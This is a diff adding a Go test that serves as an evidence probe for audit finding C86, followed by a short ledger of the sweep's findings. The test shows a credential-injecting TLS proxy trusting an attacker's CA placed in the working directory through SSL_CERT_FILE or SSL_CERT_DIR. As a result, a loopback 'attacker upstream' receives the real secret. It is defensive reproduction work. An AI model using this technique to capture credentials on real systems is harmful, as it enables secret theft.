+    // Evidence probe for finding C86 of S-1013, sweep 3 (I6, through it I5): the absolute sibling of C30 and C53. Terminate under SSL_CERT_FILE=<cwd>/certs/ca.pem, or SSL_CERT_DIR=<cwd>/certs, builds the upstream pool from the repository's file, so the attacker's upstream, holding a leaf of that CA for an allowed name, is sent the real secret. The fix lies in cmd/workcell (the session is refused before newSession, see cmd/workcell/c86_test.go, the reproducing test), so this probe shows the effect and stays red on its own: it is not the test the fix turns green.
+    
+    package proxy
+    
+    import (
+    	"crypto/tls"
+    	"net/http"
+    	"net/netip"
+    	"os"
+    	"os/exec"
+    	"path/filepath"
+    	"strings"
+    	"testing"
+    	"time"
+    )
+    
+    // TestC86AbsoluteSSLCertPathUnderTheWorkingDirectory re-runs this binary once per variable, since Go loads the system pool once per process and SSL_CERT_DIR reaches it only that way. The child, in a working directory W holding certs/ca.pem (the attacker's CA: the repository ships it, or guest root writes it under --mount, modelled by this host write), under SSL_CERT_FILE=W/certs/ca.pem or SSL_CERT_DIR=W/certs alone, has Terminate take the file, and the attacker's loopback upstream echoes the secret it got.
+    func TestC86AbsoluteSSLCertPathUnderTheWorkingDirectory(t *testing.T) {
+    	if os.Getenv("C86_CHILD") == "" {
+    		for _, v := range []string{"SSL_CERT_FILE", "SSL_CERT_DIR"} {
+    			cmd := exec.Command(os.Args[0], "-test.run=^"+t.Name()+"$")
+    			cmd.Dir = t.TempDir()
+    			cmd.Env = append(os.Environ(), "C86_CHILD=1", "SSL_CERT_FILE=", "SSL_CERT_DIR=", v+"="+strings.TrimSuffix(filepath.Join(cmd.Dir, "certs", "ca.pem"), map[string]string{"SSL_CERT_DIR": "/ca.pem"}[v])) // the one variable set, to an absolute path under the working directory
+    			if out, err := cmd.CombinedOutput(); err != nil {
+    				t.Errorf("under %s, an absolute path under the working directory: %v\n%s", v, err, out)
+    			}
+    		}
+    		return
+    	}
+    	repoCA, sessionCA := must(NewSessionCA([]string{"api.example.com"}, time.Now().Add(time.Hour))), must(NewSessionCA([]string{"api.example.com"}, time.Now().Add(time.Hour)))
+    	must(0, os.Mkdir("certs", 0o700)) // the attacker made repoCA and keeps the key of the leaf below
+    	must(0, os.WriteFile("certs/ca.pem", repoCA.CertPEM(), 0o600))
+    	ln := must(tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{*must(repoCA.leaf("api.example.com"))}}))       // the attacker's upstream, where its DNS answer sends the proxy
+    	go http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte(r.Header.Get("X-Api-Key"))) })) // echoes the credential header it got
+    	p, _, _ := testProxy(t, "api.example.com:443", []netip.Addr{netip.MustParseAddr("8.8.8.8")}, ln.Addr().String())
+    	if p.Terminate(sessionCA, &fakeBroker{value: "real-secret"}, []TerminateRule{{Host: "api.example.com", Header: "X-Api-Key", Placeholder: testPlaceholder}}) == nil { // a refusal here would hold the invariant as well
+    		if code, body := get(t, clientVia(listen(t, p, 443), caPool(t, sessionCA)), "https://api.example.com/v1/x", testPlaceholder); code < 400 || body == "real-secret" {
+    			t.Errorf("I6: under SSL_CERT_FILE=%q SSL_CERT_DIR=%q, absolute paths under the working directory, the attacker's upstream, holding a leaf of the repository's CA, answered (%d, %q): the real secret left", os.Getenv("SSL_CERT_FILE"), os.Getenv("SSL_CERT_DIR"), code, body)
+    		}
+    	}
+    }
+
+After S-1013: sweep 3 stands at two highs (C76 and C77, both fixed), sixteen mediums (C65, C66, C67, C68, C69, C71,
+C72, C73, C74, C75, C78, C80, C81 and C82, fixed; C85 and C86, open) and five lows (C64, C70, C79, C83 and C84, all
+fixed). Nothing waits under escape/_pending/: the tests of C85 and C86 are held in their records above, and S-F69
+and S-F70 re-create them. The next candidate number is C87 and the next fix unit S-F71.
